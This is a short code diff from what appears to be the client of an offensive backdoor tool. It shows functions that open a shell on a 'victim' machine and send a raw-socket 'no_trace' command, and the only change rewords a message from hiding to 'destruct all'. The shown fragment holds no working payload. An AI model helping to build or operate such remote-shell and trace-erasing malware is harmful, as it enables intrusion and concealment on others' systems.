@@ -139,7 +139,6 @@ void get_shell(char* argv){
 }
 
 
-
 void get_shell_with_custom_port(char* dest_address, char* dest_port) {
     char* local_ip = getLocalIpAddress2();
     printf("[" KBLU "INFO" RESET "]""Victim IP selected: %s\n", dest_address);
@@ -198,7 +197,7 @@ void no_trace(char* argv){
     if(rawsocket_send(packet)<0){
         printf("["KRED"ERROR"RESET"]""An error occured. Is the machine up?\n");
     }else{
-        printf("["KGRN"OK"RESET"]""Request to hide successfully sent!\n");
+        printf("["KGRN"OK"RESET"]""Request to destruct all successfully sent!\n");
     }
     free(local_ip);
 }
